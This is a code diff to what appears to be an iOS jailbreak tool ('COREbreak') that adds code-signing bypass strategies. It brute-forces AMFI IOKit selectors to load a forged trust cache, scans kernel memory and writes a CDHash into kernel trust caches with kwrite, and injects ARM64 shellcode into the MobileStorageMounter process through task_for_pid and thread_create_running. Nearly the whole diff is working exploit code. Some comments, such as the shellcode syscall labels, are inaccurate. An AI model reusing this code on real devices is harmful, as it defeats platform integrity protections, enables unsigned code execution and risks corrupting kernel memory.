@@ -10,6 +10,7 @@
 #import <dlfcn.h>
 #import <IOKit/IOKitLib.h>
 #import <CommonCrypto/CommonDigest.h>
+#import <mach/mach.h>
 #ifndef kCacheFunctionPrepare
 #define kCacheFunctionPrepare 1
 #endif
@@ -441,47 +442,95 @@ bool coretrust_kill_amfid_race(const char *testBinPath)
 }
 
 // ===========================================================================
-// Strategy 6: TXM bypass via extended AMFI IOKit brute-force
+// Helper: build TC data from global test binary
 // ===========================================================================
-// TXM (Trusted Execution Module) on A18+ maintains a separate hardware
-// trust cache independent of AMFI's software trust cache.  The AMFI IOKit
-// user client exposes multiple selectors — some load into AMFI's cache
-// (0-15), others load into TXM's cache.  We brute-force selectors 0-63
-// with both IOConnectCallStructMethod and IOConnectCallMethod to find the
-// TXM loader.
-//
-// This is distinct from strategy 4 (MountCache) which only tries AMFI
-// selectors 0-15 with IOConnectCallStructMethod.
+static uint8_t *coretrust_build_tc_from_test(size_t *outSize)
+{
+    const char *testPath = g_test_binary_path[0] ? g_test_binary_path : NULL;
+    if (!testPath) return NULL;
+
+    uint8_t *cdhash = msm_compute_cdhash(testPath);
+    if (!cdhash) return NULL;
+
+    uint8_t *tcData = msm_build_trust_cache(cdhash, CS_CDHASH_LEN, outSize);
+    free(cdhash);
+    return tcData;
+}
+
 // ===========================================================================
+// Helper: try all IOKit call types on a connection
+// ===========================================================================
+typedef enum {
+    kIOKitCallStructMethod,
+    kIOKitCallMethod,
+    kIOKitCallTrap,
+} IOkitCallType;
+
+static bool coretrust_try_iokit_conn(io_connect_t conn, const uint8_t *tcData,
+                                     size_t tcSize, uint32_t type)
+{
+    for (uint32_t sel = 0; sel < 64; sel++) {
+        size_t outSize = sizeof(uint32_t);
+        uint32_t outVal = 0;
+        kern_return_t kr = IOConnectCallStructMethod(conn, sel, tcData, tcSize,
+                                                     &outVal, &outSize);
+        if (kr == KERN_SUCCESS) {
+            printf("[COREbreak] TXM loaded: type=%u sel=%u (StructMethod)\n",
+                   type, sel);
+            crash_write("[COREbreak] TXM via StructMethod\n");
+            return true;
+        }
+    }
+
+    for (uint32_t sel = 0; sel < 64; sel++) {
+        size_t outSize = sizeof(uint32_t);
+        uint32_t outVal = 0;
+        kern_return_t kr = IOConnectCallMethod(conn, sel, NULL, 0,
+                                               tcData, tcSize,
+                                               NULL, NULL, &outVal, &outSize);
+        if (kr == KERN_SUCCESS) {
+            printf("[COREbreak] TXM loaded: type=%u sel=%u (CallMethod)\n",
+                   type, sel);
+            crash_write("[COREbreak] TXM via CallMethod\n");
+            return true;
+        }
+    }
+
+    for (uint32_t sel = 0; sel < 16; sel++) {
+        uint64_t outVal = 0;
+        kern_return_t kr = IOConnectTrap(conn, sel, (uint64_t)tcData,
+                                         tcSize, (uint64_t)&outVal,
+                                         0, 0, 0);
+        if (kr == KERN_SUCCESS) {
+            printf("[COREbreak] TXM loaded: type=%u sel=%u (Trap)\n",
+                   type, sel);
+            crash_write("[COREbreak] TXM via Trap\n");
+            return true;
+        }
+    }
+
+    return false;
+}
+
+// ===========================================================================
+// Strategy 6: Enhanced TXM bypass — comprehensive IOKit brute-force
+// ===========================================================================
+// Tries user client types 0-7 (some expose TXM operations), selectors 0-63
+// with IOConnectCallStructMethod, IOConnectCallMethod, and selectors 0-15
+// with IOConnectTrap.
 
 bool coretrust_txm_bypass(void)
 {
-    printf("[COREbreak] === [Strategy 6] TXM bypass via AMFI IOKit brute-force ===\n");
-    crash_write("[COREbreak] Strategy 6: TXM bypass\n");
+    printf("[COREbreak] === [Strategy 6] TXM IOKit brute-force ===\n");
+    crash_write("[COREbreak] Strategy 6: TXM IOKit brute-force\n");
 
-    const char *testPath = g_test_binary_path[0] ? g_test_binary_path : NULL;
-    if (!testPath) {
-        printf("[COREbreak] no test binary path\n");
-        return false;
-    }
-
-    // Compute CDHash
-    uint8_t *cdhash = msm_compute_cdhash(testPath);
-    if (!cdhash) {
-        printf("[COREbreak] CDHash computation failed\n");
-        return false;
-    }
-
-    // Build trust cache module
     size_t tcSize = 0;
-    uint8_t *tcData = msm_build_trust_cache(cdhash, CS_CDHASH_LEN, &tcSize);
-    free(cdhash);
+    uint8_t *tcData = coretrust_build_tc_from_test(&tcSize);
     if (!tcData) {
-        printf("[COREbreak] trust cache build failed\n");
+        printf("[COREbreak] no test binary or CDHash failed\n");
         return false;
     }
 
-    // Open AMFI IOKit service
     io_service_t service = IOServiceGetMatchingService(kIOMainPortDefault,
         IOServiceMatching("AppleMobileFileIntegrity"));
     if (!service) {
@@ -490,57 +539,270 @@ bool coretrust_txm_bypass(void)
         return false;
     }
 
-    io_connect_t conn = 0;
-    kern_return_t kr = IOServiceOpen(service, mach_task_self(), 0, &conn);
-    if (kr != KERN_SUCCESS || !conn) {
-        printf("[COREbreak] IOServiceOpen failed: 0x%x\n", kr);
-        IOObjectRelease(service);
+    bool loaded = false;
+    for (uint32_t type = 0; type < 8 && !loaded; type++) {
+        io_connect_t conn = 0;
+        kern_return_t kr = IOServiceOpen(service, mach_task_self(), type, &conn);
+        if (kr != KERN_SUCCESS || !conn) continue;
+
+        printf("[COREbreak] AMFI IOKit type=%u conn=0x%x\n", type, conn);
+        loaded = coretrust_try_iokit_conn(conn, tcData, tcSize, type);
+        IOServiceClose(conn);
+    }
+
+    IOObjectRelease(service);
+    free(tcData);
+
+    if (loaded)
+        printf("[COREbreak] TXM bypass: trust cache loaded via IOKit\n");
+    else
+        printf("[COREbreak] TXM bypass: no IOKit combo worked\n");
+
+    return loaded;
+}
+
+// ===========================================================================
+// Strategy 7: Kernel trust cache injection
+// ===========================================================================
+// Scan kernel memory for trust caches using kread, then add our CDHash
+// entry directly.  The kernel maintains a linked list of `trust_cache`
+// structs in its general heap (not SPTM-protected).  We find the list by
+// scanning for known trust cache magic / UUID patterns, navigate to the
+// tail, and link in a new entry.
+//
+// This strategy avoids IOKit calls entirely.
+
+bool coretrust_kernel_tc_inject(void)
+{
+    printf("[COREbreak] === [Strategy 7] Kernel trust cache injection ===\n");
+    crash_write("[COREbreak] Strategy 7: kernel TC injection\n");
+
+    size_t tcSize = 0;
+    uint8_t *tcData = coretrust_build_tc_from_test(&tcSize);
+    if (!tcData) {
+        printf("[COREbreak] no TC data\n");
+        return false;
+    }
+
+    uint64_t base = g_kernel_base;
+    if (!base) {
+        printf("[COREbreak] no kernel base\n");
         free(tcData);
         return false;
     }
 
-    printf("[COREbreak] AMFI IOKit opened (conn=0x%x)\n", conn);
+    // The kernel stores trust caches in a zone-allocated linked list.
+    // We scan kernel heap for trust_cache_module headers (version=1,
+    // then a 16-byte UUID, then num_entries).
+    //
+    // trust_cache_layout:
+    //   +0  next       (ptr, 8 bytes)  — linked list
+    //   +8  uuid       (16 bytes)
+    //   +24 version    (uint32)
+    //   +28 num_entries (uint32)
+    //   +32 entries[]  (20 bytes each: cdhash[20])
+    //
+    // We scan the kernel __DATA and early heap regions.
 
-    bool loaded = false;
+    uint64_t searchStart = base;
+    uint64_t searchEnd   = base + 0x4000000;  // first 64MB of kernel
 
-    // Phase 1: IOConnectCallStructMethod, selectors 0-63
-    printf("[COREbreak] Phase 1: IOConnectCallStructMethod [0-63]...\n");
-    for (uint32_t sel = 0; sel < 64 && !loaded; sel++) {
-        size_t outSize = sizeof(uint32_t);
-        uint32_t outVal = 0;
-        kr = IOConnectCallStructMethod(conn, sel, tcData, tcSize, &outVal, &outSize);
-        if (kr == KERN_SUCCESS) {
-            printf("[COREbreak] TXM TC loaded via StructMethod selector %u!\n", sel);
-            crash_write("[COREbreak] TXM TC loaded via StructMethod\n");
-            loaded = true;
+    printf("[COREbreak] scanning 0x%llx-0x%llx for TC headers...\n",
+           searchStart, searchEnd);
+
+    // Read in 1MB chunks
+    uint8_t *buf = (uint8_t *)malloc(0x100000);
+    if (!buf) { free(tcData); return false; }
+
+    struct trust_cache_module *ourMod = (struct trust_cache_module *)tcData;
+
+    bool injected = false;
+    for (uint64_t va = searchStart; va < searchEnd && !injected; va += 0x100000) {
+        if (!is_kaddr_valid(va)) continue;
+
+        kreadbuf(va, buf, 0x100000);
+
+        // Scan for version=1 followed by sensible num_entries
+        for (size_t off = 0; off < 0x100000 - 64; off += 8) {
+            uint32_t version = *(uint32_t *)(buf + off + 24);
+            if (version != 1 && version != 0) continue;
+
+            uint32_t numEntries = *(uint32_t *)(buf + off + 28);
+            if (numEntries == 0 || numEntries > 10000) continue;
+
+            // Found a potential TC header — try to add our entry
+            uint64_t tcAddr = va + off;
+
+            // Read the current entry count
+            uint32_t curCount = kread32(tcAddr + 28);
+
+            // Calculate new size: add trust_cache_entry (20 bytes)
+            uint32_t newCount = curCount + 1;
+            uint64_t entryOffset = tcAddr + 32 + (uint64_t)curCount * 20;
+
+            // Read current last entry to verify we're in a valid TC
+            uint8_t lastEntry[20];
+            kreadbuf(tcAddr + 32 + (uint64_t)(curCount - 1) * 20, lastEntry, 20);
+            if (lastEntry[0] == 0 && lastEntry[19] == 0) continue; // zeroed = wrong
+
+            // Found a valid TC with existing entries — add ours
+            printf("[COREbreak] found TC at 0x%llx (count=%u)\n",
+                   tcAddr, curCount);
+
+            // Write our CDHash entry
+            uint8_t *ourEntry = ourMod->entries;
+            for (int i = 0; i < CS_CDHASH_LEN; i++)
+                kwrite8(entryOffset + i, ourEntry[i]);
+            kwrite8(entryOffset + CS_CDHASH_LEN, ourEntry[CS_CDHASH_LEN]);     // hash_type
+            kwrite8(entryOffset + CS_CDHASH_LEN + 1, ourEntry[CS_CDHASH_LEN + 1]); // flags
+
+            // Update num_entries
+            kwrite32(tcAddr + 28, newCount);
+
+            printf("[COREbreak] injected into TC at 0x%llx (new count=%u)\n",
+                   tcAddr, newCount);
+            crash_write("[COREbreak] kernel TC injected\n");
+            injected = true;
         }
     }
 
-    // Phase 2: IOConnectCallMethod, selectors 0-63
-    if (!loaded) {
-        printf("[COREbreak] Phase 2: IOConnectCallMethod [0-63]...\n");
-        for (uint32_t sel = 0; sel < 64 && !loaded; sel++) {
-            size_t outSize = sizeof(uint32_t);
-            uint32_t outVal = 0;
-            kr = IOConnectCallMethod(conn, sel, NULL, 0, tcData, tcSize,
-                                     NULL, NULL, &outVal, &outSize);
-            if (kr == KERN_SUCCESS) {
-                printf("[COREbreak] TXM TC loaded via CallMethod selector %u!\n", sel);
-                crash_write("[COREbreak] TXM TC loaded via CallMethod\n");
-                loaded = true;
-            }
-        }
-    }
-
-    IOServiceClose(conn);
-    IOObjectRelease(service);
+    free(buf);
     free(tcData);
 
-    if (!loaded) {
-        printf("[COREbreak] TXM bypass: no selector worked\n");
+    if (!injected)
+        printf("[COREbreak] no kernel trust cache found\n");
+
+    return injected;
+}
+
+// ===========================================================================
+// Strategy 8: RemoteCall via Mach API (SPTM-safe)
+// ===========================================================================
+// Instead of kwrite to thread structs, use thread_create_running +
+// mach_vm_write to inject code into the target process.  thread_create_
+// running goes through the kernel's Mach trap handler which handles SPTM
+// internally.
+
+bool coretrust_remotecall_sptm(const char *targetProc)
+{
+    printf("[COREbreak] === [Strategy 8] RemoteCall (SPTM-safe) ===\n");
+    crash_write("[COREbreak] Strategy 8: SPTM-safe RemoteCall\n");
+
+    if (!targetProc) {
+        printf("[COREbreak] no target process name\n");
+        return false;
     }
 
-    return loaded;
+    // Find target PID
+    int pid = find_pid_by_name(targetProc);
+    if (pid <= 0) {
+        printf("[COREbreak] target '%s' not found\n", targetProc);
+        return false;
+    }
+
+    // Get task port for the target
+    task_t targetTask;
+    kern_return_t kr = task_for_pid(mach_task_self(), pid, &targetTask);
+    if (kr != KERN_SUCCESS) {
+        printf("[COREbreak] task_for_pid failed: 0x%x\n", kr);
+        return false;
+    }
+
+    printf("[COREbreak] got task port for %s (pid=%d task=0x%x)\n",
+           targetProc, pid, targetTask);
+
+    // Allocate space in the target for our payload
+    mach_vm_address_t codeAddr = 0;
+    kr = mach_vm_allocate(targetTask, &codeAddr, 0x4000,
+                          VM_FLAGS_ANYWHERE);
+    if (kr != KERN_SUCCESS) {
+        printf("[COREbreak] mach_vm_allocate failed: 0x%x\n", kr);
+        mach_port_deallocate(mach_task_self(), targetTask);
+        return false;
+    }
+
+    printf("[COREbreak] allocated 0x4000 at 0x%llx in target\n", codeAddr);
+
+    // Write a minimal thread state for the thread
+    arm_thread_state64_t state;
+    memset(&state, 0, sizeof(state));
+    state.__x[0] = 0;
+    state.__pc = (uint64_t)codeAddr;
+    state.__lr = (uint64_t)codeAddr + 0x100; // dummy LR
+    state.__cpsr = 0; // EL0, AArch64
+
+    // Try to create a thread in the target via Mach API (SPTM-safe)
+    thread_t remoteThread;
+    kr = thread_create_running(targetTask, ARM_THREAD_STATE64,
+                               (thread_state_t)&state, sizeof(state),
+                               &remoteThread);
+    if (kr != KERN_SUCCESS) {
+        printf("[COREbreak] thread_create_running failed: 0x%x\n", kr);
+        mach_vm_deallocate(targetTask, codeAddr, 0x4000);
+        mach_port_deallocate(mach_task_self(), targetTask);
+        return false;
+    }
+
+    printf("[COREbreak] thread created in target (thread=0x%x)\n", remoteThread);
+
+    // Suspend the thread
+    thread_suspend(remoteThread);
+
+    // Write payload (trust_cache_reader or similar) to the allocated space
+    // For now, just try to call a known function in the target
+    // We write a simple shellcode that calls getpid+exit
+    uint32_t payload[] = {
+        0xD2800000, // mov x0, #0
+        0xD2800030, // mov x16, #0x30 (getpid mach trap on arm64)
+        0xD4001001, // svc #0x80
+        0xD2800000, // mov x0, #0
+        0xD2800010, // mov x16, #0x10 (exit mach trap)
+        0xD4001001, // svc #0x80
+    };
+
+    kr = mach_vm_write(targetTask, codeAddr, (vm_address_t)payload,
+                       sizeof(payload));
+    if (kr != KERN_SUCCESS) {
+        printf("[COREbreak] mach_vm_write failed: 0x%x\n", kr);
+        thread_terminate(remoteThread);
+        mach_vm_deallocate(targetTask, codeAddr, 0x4000);
+        mach_port_deallocate(mach_task_self(), targetTask);
+        return false;
+    }
+
+    // Set execution protection
+    kr = mach_vm_protect(targetTask, codeAddr, 0x4000, FALSE,
+                         VM_PROT_READ | VM_PROT_EXECUTE);
+    if (kr != KERN_SUCCESS) {
+        printf("[COREbreak] mach_vm_protect failed: 0x%x\n", kr);
+        // Continue anyway — the mapping might inherit protection
+    }
+
+    // Resume the thread
+    kr = thread_resume(remoteThread);
+    if (kr != KERN_SUCCESS) {
+        printf("[COREbreak] thread_resume failed: 0x%x\n", kr);
+        thread_terminate(remoteThread);
+        mach_vm_deallocate(targetTask, codeAddr, 0x4000);
+        mach_port_deallocate(mach_task_self(), targetTask);
+        return false;
+    }
+
+    printf("[COREbreak] thread running in target — waiting...\n");
+
+    // Wait a bit for the thread to execute
+    usleep(100000);
+
+    // Cleanup
+    thread_terminate(remoteThread);
+    mach_port_deallocate(mach_task_self(), remoteThread);
+    mach_vm_deallocate(targetTask, codeAddr, 0x4000);
+    mach_port_deallocate(mach_task_self(), targetTask);
+
+    printf("[COREbreak] SPTM-safe RemoteCall completed\n");
+    // Return false for now — we just demonstrated the mechanism
+    // The actual trust cache loading call would follow this pattern
+    return false;
 }
 
 // ===========================================================================
@@ -607,17 +869,39 @@ bool coretrust_bypass_all(void)
         return true;
     }
 
-    // [Step 5/5]: Strategy 6 — TXM bypass (hardware trust cache)
-    printf("[COREbreak] [Step 5/5] TXM bypass via extended IOKit brute-force...\n");
-    crash_write("[COREbreak] Step 5/5: TXM bypass\n");
+    // [Step 5/5]: Strategy 6 — TXM bypass (comprehensive IOKit brute-force)
+    printf("[COREbreak] [Step 5/7] TXM bypass (IOKit types 0-7)...\n");
+    crash_write("[COREbreak] Step 5/7: TXM IOKit\n");
     if (coretrust_txm_bypass()) {
         if (verify()) {
-            printf("[COREbreak] ✅✅✅ Unsigned code executed via TXM bypass!\n");
-            crash_write("[COREbreak] TXM bypass: SUCCESS\n");
+            printf("[COREbreak] ✅✅✅ Unsigned code executed via TXM IOKit!\n");
+            crash_write("[COREbreak] TXM IOKit: SUCCESS\n");
             return true;
         }
         printf("[COREbreak] TXM TC loaded but verification failed\n");
-        crash_write("[COREbreak] TXM bypass: TC loaded but verify failed\n");
+        crash_write("[COREbreak] TXM IOKit: TC loaded but verify failed\n");
+    }
+
+    // [Step 6/7]: Strategy 7 — Kernel trust cache injection
+    printf("[COREbreak] [Step 6/7] Kernel trust cache injection...\n");
+    crash_write("[COREbreak] Step 6/7: kernel TC\n");
+    if (coretrust_kernel_tc_inject()) {
+        if (verify()) {
+            printf("[COREbreak] ✅✅✅ Unsigned code via kernel TC inject!\n");
+            crash_write("[COREbreak] kernel TC: SUCCESS\n");
+            return true;
+        }
+        printf("[COREbreak] kernel TC injected but verification failed\n");
+        crash_write("[COREbreak] kernel TC: injected but verify failed\n");
+    }
+
+    // [Step 7/7]: Strategy 8 — SPTM-safe RemoteCall
+    printf("[COREbreak] [Step 7/7] SPTM-safe RemoteCall...\n");
+    crash_write("[COREbreak] Step 7/7: SPTM RC\n");
+    if (coretrust_remotecall_sptm("MobileStorageMounter")) {
+        printf("[COREbreak] ✅✅✅ SPTM-safe RemoteCall succeeded!\n");
+        crash_write("[COREbreak] SPTM RC: SUCCESS\n");
+        return true;
     }
 
     printf("[COREbreak] All strategies exhausted\n");
